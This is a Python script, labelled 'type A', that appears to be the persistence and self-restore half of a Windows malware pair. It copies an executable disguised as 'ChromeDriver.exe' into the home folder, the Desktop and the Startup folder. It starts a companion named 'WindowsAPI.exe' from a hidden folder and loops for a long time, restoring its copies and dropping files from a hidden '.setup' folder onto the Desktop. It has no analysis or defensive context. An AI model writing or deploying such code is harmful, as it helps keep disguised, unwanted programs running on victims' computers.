#type A

import os
import shutil
import time

typeb = '\\test137.py'
typeb = '\\WindowsAPI.exe'

typea = '\\test136.py'
typea = '\\ChromeDriver.exe'

def restore():
    try:
        current = drive + typea
        if not os.path.isfile(drive + typea):
            shutil.copy2(current, drive + typea)
            time.sleep(5)
        if not os.path.isfile(desk + typea):
            shutil.copy2(current, desk + typea)
            time.sleep(5)
        if not os.path.isfile(start + typea):
            shutil.copy2(current, start + typea)
            time.sleep(5)
    except:
        try:
            current = start + typea
            if not os.path.isfile(drive + typea):
                shutil.copy2(current, drive + typea)
                time.sleep(5)
            if not os.path.isfile(desk + typea):
                shutil.copy2(current, desk + typea)
                time.sleep(5)
            if not os.path.isfile(start + typea):
                shutil.copy2(current, start + typea)
                time.sleep(5)
        except:
            current = desk + typea
            if not os.path.isfile(drive + typea):
                shutil.copy2(current, drive + typea)
                time.sleep(5)
            if not os.path.isfile(desk + typea):
                shutil.copy2(current, desk + typea)
                time.sleep(5)
            if not os.path.isfile(start + typea):
                shutil.copy2(current, start + typea)
                time.sleep(5)
        
def getfile():
    temp = os.listdir(setup)
    for i in temp:
        try:
            shutil.copy2(setup + '\\' + i, desk + '\\' + i)
            time.sleep(5)
        except:
            time.sleep(1)

desk = os.path.join(os.path.expanduser('~'),'Desktop')
start = os.path.join(os.path.expanduser('~'),'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
drive = os.path.expanduser('~')
setup = os.path.join(os.path.expanduser('~'),'.setup')
restart = os.path.join(os.path.expanduser('~'),'.restart')

try:
    os.startfile(restart + typeb)
except:
    pass

for i in range(0,100000):
    time.sleep(1)
    restore()
    getfile()
    time.sleep(10)
